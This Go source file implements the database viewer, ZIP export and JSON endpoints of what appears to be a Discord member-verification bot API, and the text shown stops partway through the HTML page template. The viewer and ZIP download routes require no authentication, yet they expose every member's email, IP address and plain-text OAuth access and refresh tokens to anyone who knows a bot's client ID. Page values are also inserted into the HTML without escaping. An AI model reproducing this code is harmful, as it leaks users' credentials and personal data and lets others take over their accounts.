package http

import (
	"amethys-api/database"
	"amethys-api/services"
	"archive/zip"
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/gorilla/mux"
)

// HandleDatabaseViewer → GET /api/bot/database/{botId}
// Exibe a database do bot com UI rica e botão de download ZIP
func HandleDatabaseViewer(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	botID := vars["botId"]

	ip := r.Header.Get("X-Forwarded-For")
	if ip == "" {
		ip = r.RemoteAddr
	}
	services.LogHTTPRequest(r.Method, r.URL.Path, ip, 200)

	bot, err := database.DB.FindBotByClientID(botID)
	if err != nil {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, dbNotFoundPage())
		return
	}

	allGifts, _ := database.DB.ReadGifts()
	botGifts := []database.Gift{}
	for _, g := range allGifts {
		if g.BotID == botID {
			botGifts = append(botGifts, g)
		}
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprint(w, buildDatabasePage(bot, botGifts))
}

// HandleDatabaseDownload → GET /api/bot/database/{botId}/download
// Gera e retorna um ZIP com members.txt e gifts.txt
func HandleDatabaseDownload(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	botID := vars["botId"]

	ip := r.Header.Get("X-Forwarded-For")
	if ip == "" {
		ip = r.RemoteAddr
	}
	services.LogHTTPRequest(r.Method, r.URL.Path, ip, 200)

	bot, err := database.DB.FindBotByClientID(botID)
	if err != nil {
		http.Error(w, "Bot não encontrado", http.StatusNotFound)
		return
	}

	allGifts, _ := database.DB.ReadGifts()
	botGifts := []database.Gift{}
	for _, g := range allGifts {
		if g.BotID == botID {
			botGifts = append(botGifts, g)
		}
	}

	// Montar ZIP em memória
	buf := new(bytes.Buffer)
	zw := zip.NewWriter(buf)

	// ── members.txt ──────────────────────────────────────────────────────────
	membersTxt := buildMembersTxt(bot)
	mf, err := zw.Create("members.txt")
	if err != nil {
		http.Error(w, "Erro ao criar zip", http.StatusInternalServerError)
		return
	}
	mf.Write([]byte(membersTxt))

	// ── gifts.txt ─────────────────────────────────────────────────────────────
	giftsTxt := buildGiftsTxt(botGifts)
	gf, err := zw.Create("gifts.txt")
	if err != nil {
		http.Error(w, "Erro ao criar zip", http.StatusInternalServerError)
		return
	}
	gf.Write([]byte(giftsTxt))

	// ── bot_info.txt ──────────────────────────────────────────────────────────
	infoTxt := buildBotInfoTxt(bot, botGifts)
	inf, err := zw.Create("bot_info.txt")
	if err != nil {
		http.Error(w, "Erro ao criar zip", http.StatusInternalServerError)
		return
	}
	inf.Write([]byte(infoTxt))

	// ── raw_members.json ──────────────────────────────────────────────────────
	membersJSON, _ := json.MarshalIndent(bot.Members, "", "  ")
	jmf, err := zw.Create("raw_members.json")
	if err != nil {
		http.Error(w, "Erro ao criar zip", http.StatusInternalServerError)
		return
	}
	jmf.Write(membersJSON)

	// ── raw_gifts.json ────────────────────────────────────────────────────────
	giftsJSON, _ := json.MarshalIndent(botGifts, "", "  ")
	jgf, err := zw.Create("raw_gifts.json")
	if err != nil {
		http.Error(w, "Erro ao criar zip", http.StatusInternalServerError)
		return
	}
	jgf.Write(giftsJSON)

	zw.Close()

	now := time.Now().Format("2006-01-02_15-04-05")
	filename := fmt.Sprintf("database_%s_%s.zip", sanitizeFilename(botID), now)

	w.Header().Set("Content-Type", "application/zip")
	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, filename))
	w.Header().Set("Content-Length", fmt.Sprintf("%d", buf.Len()))
	w.Write(buf.Bytes())

	services.LogSuccess(
		"Database Downloaded",
		fmt.Sprintf("Database do bot %s exportada (%d membros, %d gifts)", botID, len(bot.Members), len(botGifts)),
		map[string]string{"BotID": botID, "Members": fmt.Sprintf("%d", len(bot.Members)), "Gifts": fmt.Sprintf("%d", len(botGifts))},
	)
}

// HandleDatabaseData → GET /api/bot/database/{botId}/data
// Retorna JSON com membros e gifts autenticado via Authorization: Bot <token>
func HandleDatabaseData(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	botID := vars["botId"]

	ip := r.Header.Get("X-Forwarded-For")
	if ip == "" {
		ip = r.RemoteAddr
	}

	// Verificar autenticação via token do bot
	authHeader := r.Header.Get("Authorization")
	if !strings.HasPrefix(authHeader, "Bot ") {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(map[string]any{"success": false, "message": "Token não fornecido"})
		return
	}
	providedToken := strings.TrimPrefix(authHeader, "Bot ")

	bot, err := database.DB.FindBotByClientID(botID)
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]any{"success": false, "message": "Bot não encontrado"})
		return
	}

	// Validar token
	if bot.Token != providedToken {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusForbidden)
		json.NewEncoder(w).Encode(map[string]any{"success": false, "message": "Token inválido"})
		return
	}

	allGifts, _ := database.DB.ReadGifts()
	botGifts := []database.Gift{}
	for _, g := range allGifts {
		if g.BotID == botID {
			botGifts = append(botGifts, g)
		}
	}

	verifiedCount := 0
	for _, m := range bot.Members {
		if m.VerifiedAt != "" {
			verifiedCount++
		}
	}

	activeGifts, usedGifts, expiredGifts := 0, 0, 0
	for _, g := range botGifts {
		switch g.Status {
		case "active":
			activeGifts++
		case "used":
			usedGifts++
		case "expired":
			expiredGifts++
		}
	}

	services.LogHTTPRequest(r.Method, r.URL.Path, ip, 200)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]any{
		"success": true,
		"data": map[string]any{
			"bot": map[string]any{
				"id":             bot.ID,
				"client_id":      bot.ClientID,
				"main_server_id": bot.MainServerID,
			},
			"members": bot.Members,
			"gifts":   botGifts,
			"stats": map[string]any{
				"total_members":    len(bot.Members),
				"verified_members": verifiedCount,
				"total_gifts":      len(botGifts),
				"active_gifts":     activeGifts,
				"used_gifts":       usedGifts,
				"expired_gifts":    expiredGifts,
			},
		},
	})
}

// ── Builders de texto ─────────────────────────────────────────────────────────

func buildMembersTxt(bot *database.Bot) string {
	var sb strings.Builder
	line := strings.Repeat("═", 80)
	thin := strings.Repeat("─", 80)

	sb.WriteString(fmt.Sprintf("%s\n", line))
	sb.WriteString(fmt.Sprintf("  MEMBERS DATABASE — Bot: %s\n", bot.ClientID))
	sb.WriteString(fmt.Sprintf("  Exportado em: %s\n", time.Now().Format("02/01/2006 15:04:05")))
	sb.WriteString(fmt.Sprintf("  Total de membros: %d\n", len(bot.Members)))
	sb.WriteString(fmt.Sprintf("%s\n\n", line))

	if len(bot.Members) == 0 {
		sb.WriteString("  Nenhum membro registrado.\n")
		return sb.String()
	}

	for i, m := range bot.Members {
		sb.WriteString(fmt.Sprintf("  [%04d] %s\n", i+1, thin))
		sb.WriteString(fmt.Sprintf("  ID            : %s\n", m.ID))
		sb.WriteString(fmt.Sprintf("  Username      : %s\n", m.Username))
		if m.Discriminator != "" && m.Discriminator != "0" {
			sb.WriteString(fmt.Sprintf("  Discriminator : #%s\n", m.Discriminator))
		}
		sb.WriteString(fmt.Sprintf("  Email         : %s\n", nvl(m.Email, "N/A")))
		sb.WriteString(fmt.Sprintf("  IP            : %s\n", nvl(m.IP, "N/A")))
		sb.WriteString(fmt.Sprintf("  Verificado em : %s\n", nvl(m.VerifiedAt, "N/A")))
		sb.WriteString(fmt.Sprintf("  Access Token  : %s\n", nvl(m.AccessToken, "N/A")))
		sb.WriteString(fmt.Sprintf("  Refresh Token : %s\n", nvl(m.RefreshToken, "N/A")))
		sb.WriteString(fmt.Sprintf("  Guild ID      : %s\n", nvl(m.GuildID, "N/A")))
		sb.WriteString(fmt.Sprintf("  Client ID     : %s\n", nvl(m.ClientID, "N/A")))
		if m.UnverifiedAt != "" {
			sb.WriteString(fmt.Sprintf("  Desverificado : %s\n", m.UnverifiedAt))
			sb.WriteString(fmt.Sprintf("  Motivo        : %s\n", nvl(m.Reason, "N/A")))
		}
		sb.WriteString("\n")
	}

	sb.WriteString(fmt.Sprintf("%s\n", line))
	sb.WriteString(fmt.Sprintf("  FIM DO ARQUIVO — %d membros exportados\n", len(bot.Members)))
	sb.WriteString(fmt.Sprintf("%s\n", line))

	return sb.String()
}

func buildGiftsTxt(gifts []database.Gift) string {
	var sb strings.Builder
	line := strings.Repeat("═", 80)
	thin := strings.Repeat("─", 80)

	sb.WriteString(fmt.Sprintf("%s\n", line))
	sb.WriteString(fmt.Sprintf("  GIFTS DATABASE\n"))
	sb.WriteString(fmt.Sprintf("  Exportado em: %s\n", time.Now().Format("02/01/2006 15:04:05")))
	sb.WriteString(fmt.Sprintf("  Total de gifts: %d\n", len(gifts)))
	sb.WriteString(fmt.Sprintf("%s\n\n", line))

	if len(gifts) == 0 {
		sb.WriteString("  Nenhum gift registrado.\n")
		return sb.String()
	}

	for i, g := range gifts {
		sb.WriteString(fmt.Sprintf("  [%04d] %s\n", i+1, thin))
		sb.WriteString(fmt.Sprintf("  ID            : %s\n", g.ID))
		sb.WriteString(fmt.Sprintf("  Bot ID        : %s\n", g.BotID))
		sb.WriteString(fmt.Sprintf("  Status        : %s\n", g.Status))
		sb.WriteString(fmt.Sprintf("  Membros       : %d\n", g.MembersCount))
		sb.WriteString(fmt.Sprintf("  Max Usos      : %d\n", g.MaxUses))
		sb.WriteString(fmt.Sprintf("  Usos          : %d\n", g.UsedCount))
		sb.WriteString(fmt.Sprintf("  Criado por    : %s\n", nvl(g.CreatedBy, "N/A")))
		sb.WriteString(fmt.Sprintf("  Criado em     : %s\n", g.CreatedAt.Format("02/01/2006 15:04:05")))
		if !g.UpdatedAt.IsZero() {
			sb.WriteString(fmt.Sprintf("  Atualizado em : %s\n", g.UpdatedAt.Format("02/01/2006 15:04:05")))
			sb.WriteString(fmt.Sprintf("  Atualizado por: %s\n", nvl(g.UpdatedBy, "N/A")))
		}
		if !g.LastUsed.IsZero() {
			sb.WriteString(fmt.Sprintf("  Último uso    : %s\n", g.LastUsed.Format("02/01/2006 15:04:05")))
			sb.WriteString(fmt.Sprintf("  Último Guild  : %s\n", nvl(g.LastGuildID, "N/A")))
		}
		sb.WriteString("\n")
	}

	sb.WriteString(fmt.Sprintf("%s\n", line))
	sb.WriteString(fmt.Sprintf("  FIM DO ARQUIVO — %d gifts exportados\n", len(gifts)))
	sb.WriteString(fmt.Sprintf("%s\n", line))

	return sb.String()
}

func buildBotInfoTxt(bot *database.Bot, gifts []database.Gift) string {
	var sb strings.Builder
	line := strings.Repeat("═", 80)

	activeGifts, usedGifts := 0, 0
	for _, g := range gifts {
		if g.Status == "active" {
			activeGifts++
		} else if g.Status == "used" {
			usedGifts++
		}
	}

	verifiedCount := 0
	for _, m := range bot.Members {
		if m.VerifiedAt != "" {
			verifiedCount++
		}
	}

	sb.WriteString(fmt.Sprintf("%s\n", line))
	sb.WriteString(fmt.Sprintf("  BOT INFO — Exportado em %s\n", time.Now().Format("02/01/2006 15:04:05")))
	sb.WriteString(fmt.Sprintf("%s\n\n", line))
	sb.WriteString(fmt.Sprintf("  Bot ID        : %s\n", bot.ID))
	sb.WriteString(fmt.Sprintf("  Client ID     : %s\n", bot.ClientID))
	sb.WriteString(fmt.Sprintf("  Main Server   : %s\n", nvl(bot.MainServerID, "N/A")))
	sb.WriteString(fmt.Sprintf("\n  ── Membros ──\n"))
	sb.WriteString(fmt.Sprintf("  Total         : %d\n", len(bot.Members)))
	sb.WriteString(fmt.Sprintf("  Verificados   : %d\n", verifiedCount))
	sb.WriteString(fmt.Sprintf("\n  ── Gifts ──\n"))
	sb.WriteString(fmt.Sprintf("  Total         : %d\n", len(gifts)))
	sb.WriteString(fmt.Sprintf("  Ativos        : %d\n", activeGifts))
	sb.WriteString(fmt.Sprintf("  Usados        : %d\n", usedGifts))
	sb.WriteString(fmt.Sprintf("\n%s\n", line))

	return sb.String()
}

// ── UI HTML ────────────────────────────────────────────────────────────────────

func buildDatabasePage(bot *database.Bot, gifts []database.Gift) string {
	// Estatísticas
	verifiedCount := 0
	for _, m := range bot.Members {
		if m.VerifiedAt != "" {
			verifiedCount++
		}
	}
	activeGifts, usedGifts, expiredGifts := 0, 0, 0
	for _, g := range gifts {
		switch g.Status {
		case "active":
			activeGifts++
		case "used":
			usedGifts++
		case "expired":
			expiredGifts++
		}
	}

	// Serializar membros e gifts como JSON para o JS da página
	membersJSON, _ := json.Marshal(bot.Members)
	giftsJSON, _ := json.Marshal(gifts)

	mainServerDisplay := bot.MainServerID
	if mainServerDisplay == "" {
		mainServerDisplay = "—"
	}

	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Database — %s</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg:       #080a0f;
      --surface:  #0d1017;
      --panel:    #111520;
      --border:   rgba(99,120,255,0.12);
      --border2:  rgba(255,255,255,0.06);
      --accent:   #6378ff;
      --accent2:  #a78bfa;
      --success:  #22d3a3;
      --warning:  #f59e0b;
      --danger:   #f43f5e;
      --text:     #e8eaf6;
      --muted:    #6b7280;
      --dim:      #374151;
    }
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    html { scroll-behavior: smooth; }

    body {
      font-family: 'Syne', sans-serif;
      background: var(--bg);
      color: var(--text);
      min-height: 100vh;
      overflow-x: hidden;
    }

    /* ── Grid background ── */
    body::before {
      content: '';
      position: fixed;
      inset: 0;
      background-image:
        linear-gradient(rgba(99,120,255,0.03) 1px, transparent 1px),
        linear-gradient(90deg, rgba(99,120,255,0.03) 1px, transparent 1px);
      background-size: 40px 40px;
      pointer-events: none;
      z-index: 0;
    }

    /* ── Glow blobs ── */
    .blob {
      position: fixed;
      border-radius: 50%%;
      filter: blur(120px);
      pointer-events: none;
      z-index: 0;
    }
    .blob-1 { width:500px; height:500px; background:rgba(99,120,255,0.07); top:-150px; left:-100px; }
    .blob-2 { width:400px; height:400px; background:rgba(167,139,250,0.05); bottom:-100px; right:-100px; }

    /* ── Layout ── */
    .wrap {
      position: relative;
      z-index: 1;
      max-width: 1200px;
      margin: 0 auto;
      padding: 0 24px 80px;
    }

    /* ── Header ── */
    header {
      padding: 40px 0 32px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      flex-wrap: wrap;
      gap: 20px;
      border-bottom: 1px solid var(--border);
      margin-bottom: 36px;
    }

    .header-left { display: flex; align-items: center; gap: 20px; }

    .bot-avatar {
      width: 56px; height: 56px;
      border-radius: 16px;
      background: linear-gradient(135deg, var(--accent), var(--accent2));
      display: flex; align-items: center; justify-content: center;
      font-size: 24px;
      font-weight: 800;
      color: #fff;
      flex-shrink: 0;
      box-shadow: 0 0 0 1px var(--border), 0 8px 32px rgba(99,120,255,0.25);
    }

    .bot-meta h1 {
      font-size: 22px;
      font-weight: 800;
      letter-spacing: -0.5px;
      color: var(--text);
    }

    .bot-meta p {
      font-family: 'JetBrains Mono', monospace;
      font-size: 12px;
      color: var(--muted);
      margin-top: 4px;
    }

    .badge {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      padding: 4px 10px;
      border-radius: 20px;
      font-size: 11px;
      font-weight: 600;
      letter-spacing: 0.5px;
      border: 1px solid;
    }
    .badge-green  { background: rgba(34,211,163,0.1); border-color: rgba(34,211,163,0.25); color: var(--success); }
    .badge-blue   { background: rgba(99,120,255,0.1); border-color: rgba(99,120,255,0.25); color: var(--accent); }
    .badge-orange { background: rgba(245,158,11,0.1); border-color: rgba(245,158,11,0.25); color: var(--warning); }
    .badge-red    { background: rgba(244,63,94,0.1);  border-color: rgba(244,63,94,0.25);  color: var(--danger); }

    /* ── Download button ── */
    .btn-download {
      display: inline-flex;
      align-items: center;
      gap: 10px;
      padding: 12px 24px;
      border-radius: 12px;
      background: linear-gradient(135deg, var(--accent), var(--accent2));
      color: #fff;
      font-family: 'Syne', sans-serif;
      font-size: 14px;
      font-weight: 700;
      text-decoration: none;
      border: none;
      cursor: pointer;
      transition: all .25s ease;
      box-shadow: 0 4px 20px rgba(99,120,255,0.3);
      position: relative;
      overflow: hidden;
    }
    .btn-download::before {
      content: '';
      position: absolute;
      top: 0; left: -100%%;
      width: 100%%; height: 100%%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
      transition: left .5s;
    }
    .btn-download:hover::before { left: 100%%; }
    .btn-download:hover { transform: translateY(-2px); box-shadow: 0 8px 28px rgba(99,120,255,0.45); }
    .btn-download:active { transform: translateY(0); }

    /* ── Stats grid ── */
    .stats {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
      gap: 16px;
      margin-bottom: 36px;
    }

    .stat-card {
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: 16px;
      padding: 20px 24px;
      position: relative;
      overflow: hidden;
      transition: border-color .2s, transform .2s;
    }
    .stat-card:hover { border-color: rgba(99,120,255,0.3); transform: translateY(-2px); }
    .stat-card::before {
      content: '';
      position: absolute;
      top: 0; left: 0; right: 0; height: 1px;
      background: linear-gradient(90deg, transparent, var(--accent), transparent);
      opacity: 0.4;
    }

    .stat-label {
      font-size: 11px;
      font-weight: 600;
      letter-spacing: 1px;
      text-transform: uppercase;
      color: var(--muted);
      margin-bottom: 10px;
    }
    .stat-value {
      font-size: 32px;
      font-weight: 800;
      letter-spacing: -1px;
      color: var(--text);
      line-height: 1;
    }
    .stat-sub { font-size: 12px; color: var(--muted); margin-top: 6px; }

    .stat-icon {
      position: absolute;
      right: 20px; top: 50%%;
      transform: translateY(-50%%);
      font-size: 28px;
      opacity: 0.08;
    }

    /* ── Tabs ── */
    .tabs {
      display: flex;
      gap: 4px;
      margin-bottom: 24px;
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: 14px;
      padding: 6px;
      width: fit-content;
    }
    .tab {
      display: flex; align-items: center; gap: 8px;
      padding: 10px 20px;
      border-radius: 10px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      border: none;
      background: transparent;
      color: var(--muted);
      font-family: 'Syne', sans-serif;
      transition: all .2s;
    }
    .tab.active {
      background: linear-gradient(135deg, rgba(99,120,255,0.15), rgba(167,139,250,0.1));
      color: var(--text);
      border: 1px solid var(--border);
    }
    .tab:hover:not(.active) { color: var(--text); }

    .tab-count {
      display: inline-flex; align-items: center; justify-content: center;
      min-width: 20px; height: 20px;
      padding: 0 6px;
      border-radius: 6px;
      font-size: 11px;
      font-weight: 700;
      background: rgba(99,120,255,0.15);
      color: var(--accent);
    }
    .tab.active .tab-count { background: var(--accent); color: #fff; }

    /* ── Search & filter bar ── */
    .toolbar {
      display: flex;
      align-items: center;
      gap: 12px;
      margin-bottom: 20px;
      flex-wrap: wrap;
    }

    .search-wrap {
      flex: 1;
      min-width: 240px;
      position: relative;
    }
    .search-wrap svg {
      position: absolute; left: 14px; top: 50%%;
      transform: translateY(-50%%);
      color: var(--muted);
      pointer-events: none;
    }
    .search-input {
      width: 100%%;
      padding: 11px 14px 11px 40px;
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: 10px;
      color: var(--text);
      font-family: 'JetBrains Mono', monospace;
      font-size: 13px;
      outline: none;
      transition: border-color .2s;
    }
    .search-input:focus { border-color: var(--accent); }
    .search-input::placeholder { color: var(--dim); }

    .filter-select {
      padding: 11px 14px;
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: 10px;
      color: var(--text);
      font-family: 'Syne', sans-serif;
      font-size: 13px;
      font-weight: 600;
      outline: none;
      cursor: pointer;
      transition: border-color .2s;
    }
    .filter-select:focus { border-color: var(--accent); }

    /* ── Table ── */
    .table-wrap {
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: 16px;
      overflow: hidden;
    }

    .table-scroll { overflow-x: auto; }

    table {
      width: 100%%;
      border-collapse: collapse;
      font-size: 13px;
    }

    thead tr {
      background: var(--panel);
      border-bottom: 1px solid var(--border);
    }

    th {
      padding: 14px 16px;
      text-align: left;
      font-size: 11px;
      font-weight: 700;
      letter-spacing: 0.8px;
      text-transform: uppercase;
      color: var(--muted);
      white-space: nowrap;
    }

    td {
      padding: 13px 16px;
      border-bottom: 1px solid var(--border2);
      vertical-align: middle;
      color: var(--text);
    }

    tbody tr { transition: background .15s; }
    tbody tr:last-child td { border-bottom: none; }
    tbody tr:hover { background: rgba(99,120,255,0.04); }

    .mono {
      font-family: 'JetBrains Mono', monospace;
      font-size: 12px;
      color: var(--accent2);
    }

    .token-cell {
      font-family: 'JetBrains Mono', monospace;
      font-size: 11px;
      color: var(--muted);
      max-width: 160px;
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
    }

    .copy-btn {
      display: inline-flex; align-items: center; justify-content: center;
      width: 26px; height: 26px;
      border-radius: 6px;
      background: rgba(99,120,255,0.1);
      border: 1px solid var(--border);
      color: var(--muted);
      cursor: pointer;
      transition: all .15s;
      flex-shrink: 0;
    }
    .copy-btn:hover { background: rgba(99,120,255,0.2); color: var(--accent); border-color: var(--accent); }

    .token-wrap { display: flex; align-items: center; gap: 6px; max-width: 200px; }

    .avatar-cell {
      display: flex; align-items: center; gap: 10px;
    }
    .avatar-mini {
      width: 32px; height: 32px;
      border-radius: 50%%;
      background: linear-gradient(135deg, var(--accent), var(--accent2));
      display: flex; align-items: center; justify-content: center;
      font-size: 12px;
      font-weight: 700;
      color: #fff;
      flex-shrink: 0;
    }
    .avatar-img {
      width: 32px; height: 32px;
      border-radius: 50%%;
      object-fit: cover;
      border: 1px solid var(--border);
    }

    /* ── Empty state ── */
    .empty {
      text-align: center;
      padding: 64px 24px;
      color: var(--muted);
    }
    .empty svg { margin-bottom: 16px; opacity: 0.3; }
    .empty p { font-size: 15px; }

    /* ── Pagination ── */
    .pagination {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 16px 20px;
      border-top: 1px solid var(--border2);
      background: var(--panel);
      font-size: 13px;
      color: var(--muted);
      flex-wrap: wrap;
      gap: 12px;
    }
    .page-btns { display: flex; gap: 6px; }
    .page-btn {
      display: inline-flex; align-items: center; justify-content: center;
      min-width: 34px; height: 34px;
      padding: 0 10px;
      border-radius: 8px;
      background: var(--surface);
      border: 1px solid var(--border);
      color: var(--text);
      font-family: 'Syne', sans-serif;
      font-size: 13px;
      font-weight: 600;
      cursor: pointer;
      transition: all .15s;
    }
    .page-btn:hover:not(:disabled) { background: rgba(99,120,255,0.1); border-color: var(--accent); color: var(--accent); }
    .page-btn.active { background: var(--accent); border-color: var(--accent); color: #fff; }
    .page-btn:disabled { opacity: 0.35; cursor: not-allowed; }

    /* ── Detail modal ── */
    .modal-overlay {
      display: none;
      position: fixed; inset: 0;
      background: rgba(0,0,0,0.75);
      backdrop-filter: blur(4px);
      z-index: 100;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .modal-overlay.open { display: flex; }
    .modal {
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: 20px;
      padding: 32px;
      max-width: 600px;
      width: 100%%;
      max-height: 80vh;
      overflow-y: auto;
      position: relative;
      box-shadow: 0 40px 80px rgba(0,0,0,0.6);
    }
    .modal::before {
      content: '';
      position: absolute; top: 0; left: 0; right: 0; height: 1px;
      background: linear-gradient(90deg, transparent, var(--accent), transparent);
    }
    .modal-close {
      position: absolute; top: 16px; right: 16px;
      width: 32px; height: 32px;
      border-radius: 8px;
      background: rgba(255,255,255,0.05);
      border: 1px solid var(--border2);
      color: var(--muted);
      cursor: pointer;
      display: flex; align-items: center; justify-content: center;
      transition: all .15s;
    }
    .modal-close:hover { background: rgba(244,63,94,0.1); color: var(--danger); border-color: var(--danger); }
    .modal h2 { font-size: 20px; font-weight: 800; margin-bottom: 24px; }
    .modal-row {
      display: flex;
      gap: 12px;
      padding: 10px 0;
      border-bottom: 1px solid var(--border2);
      font-size: 13px;
      align-items: flex-start;
    }
    .modal-row:last-child { border-bottom: none; }
    .modal-key {
      font-family: 'JetBrains Mono', monospace;
      color: var(--muted);
      font-size: 11px;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      min-width: 140px;
      padding-top: 1px;
    }
    .modal-val {
      font-family: 'JetBrains Mono', monospace;
      color: var(--text);
      font-size: 12px;
      word-break: break-all;
      flex: 1;
    }

    /* ── Toast ── */
    #toast {
      position: fixed; bottom: 32px; right: 32px;
      background: var(--success);
      color: #000;
      font-weight: 700;
      font-size: 13px;
      padding: 12px 20px;
      border-radius: 10px;
      z-index: 999;
      opacity: 0;
      transform: translateY(10px);
      transition: all .3s;
      pointer-events: none;
    }
    #toast.show { opacity: 1; transform: translateY(0); }

    /* ── Panel section title ── */
    .section-title {
      font-size: 11px;
      font-weight: 700;
      letter-spacing: 1.5px;
      text-transform: uppercase;
      color: var(--muted);
      margin-bottom: 16px;
      display: flex; align-items: center; gap: 10px;
    }
    .section-title::after {
      content: '';
      flex: 1;
      height: 1px;
      background: var(--border);
    }

    /* ── Info panel ── */
    .info-panel {
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: 16px;
      padding: 24px;
      margin-bottom: 36px;
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 20px;
    }
    .info-item label {
      display: block;
      font-size: 11px;
      font-weight: 700;
      letter-spacing: 0.8px;
      text-transform: uppercase;
      color: var(--muted);
      margin-bottom: 6px;
    }
    .info-item span {
      font-family: 'JetBrains Mono', monospace;
      font-size: 13px;
      color: var(--text);
    }

    @media (max-width: 768px) {
      header { flex-direction: column; align-items: flex-start; }
      .tabs { width: 100%%; }
      .tab { flex: 1; justify-content: center; }
    }
  </style>
</head>
<body>
  <div class="blob blob-1"></div>
  <div class="blob blob-2"></div>

  <div class="wrap">
    <!-- Header -->
    <header>
      <div class="header-left">
        <div class="bot-avatar">%s</div>
        <div class="bot-meta">
          <h1>Database Viewer</h1>
          <p>%s · %s</p>
        </div>
      </div>
      <a class="btn-download" href="/api/bot/database/%s/download">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
        Exportar ZIP
      </a>
    </header>

    <!-- Bot info -->
    <div class="section-title">Informações do Bot</div>
    <div class="info-panel">
      <div class="info-item"><label>Bot ID</label><span>%s</span></div>
      <div class="info-item"><label>Client ID</label><span>%s</span></div>
      <div class="info-item"><label>Main Server</label><span>%s</span></div>
      <div class="info-item"><label>Exportado em</label><span id="exportTime"></span></div>
    </div>

    <!-- Stats -->
    <div class="section-title">Estatísticas</div>
    <div class="stats">
      <div class="stat-card">
        <div class="stat-label">Total Membros</div>
        <div class="stat-value">%d</div>
        <div class="stat-sub">%d verificados</div>
        <div class="stat-icon">👥</div>
      </div>
      <div class="stat-card">
        <div class="stat-label">Gifts Totais</div>
        <div class="stat-value">%d</div>
        <div class="stat-sub">%d ativos · %d usados</div>
        <div class="stat-icon">🎁</div>
      </div>
      <div class="stat-card">
        <div class="stat-label">Taxa Verificação</div>
        <div class="stat-value">%s%%</div>
        <div class="stat-sub">dos membros</div>
        <div class="stat-icon">✅</div>
      </div>
      <div class="stat-card">
        <div class="stat-label">Gifts Expirados</div>
        <div class="stat-value">%d</div>
        <div class="stat-sub">status expired</div>
        <div class="stat-icon">⏰</div>
      </div>
    </div>

    <!-- Tabs -->
    <div class="tabs">
      <button class="tab active" onclick="switchTab('members')" id="tab-members">
        👥 Membros <span class="tab-count" id="cnt-members">%d</span>
      </button>
      <button class="tab" onclick="switchTab('gifts')" id="tab-gifts">
        🎁 Gifts <span class="tab-count" id="cnt-gifts">%d</span>
      </button>
    </div>

    <!-- Members panel -->
    <div id="panel-members">
      <div class="toolbar">
        <div class="search-wrap">
          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
          <input type="text" class="search-input" id="search-members" placeholder="Pesquisar por username, ID, email..." oninput="renderMembers()">
        </div>
        <select class="filter-select" id="filter-verified" onchange="renderMembers()">
          <option value="all">Todos</option>
          <option value="verified">Verificados</option>
          <option value="unverified">Não verificados</option>
        </select>
      </div>
      <div class="table-wrap">
        <div class="table-scroll">
          <table id="members-table">
            <thead>
              <tr>
                <th>#</th>
                <th>Usuário</th>
                <th>ID</th>
                <th>Email</th>
                <th>IP</th>
                <th>Status</th>
                <th>Verificado em</th>
                <th>Access Token</th>
                <th></th>
              </tr>
            </thead>
            <tbody id="members-tbody"></tbody>
          </table>
        </div>
        <div class="pagination" id="members-pagination"></div>
      </div>
    </div>

    <!-- Gifts panel -->
    <div id="panel-gifts" style="display:none">
      <div class="toolbar">
        <div class="search-wrap">
          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
          <input type="text" class="search-input" id="search-gifts" placeholder="Pesquisar por ID, guild..." oninput="renderGifts()">
        </div>
        <select class="filter-select" id="filter-gift-status" onchange="renderGifts()">
          <option value="all">Todos</option>
          <option value="active">Ativos</option>
          <option value="used">Usados</option>
          <option value="expired">Expirados</option>
        </select>
      </div>
      <div class="table-wrap">
        <div class="table-scroll">
          <table id="gifts-table">
            <thead>
              <tr>
                <th>#</th>
                <th>Gift ID</th>
                <th>Status</th>
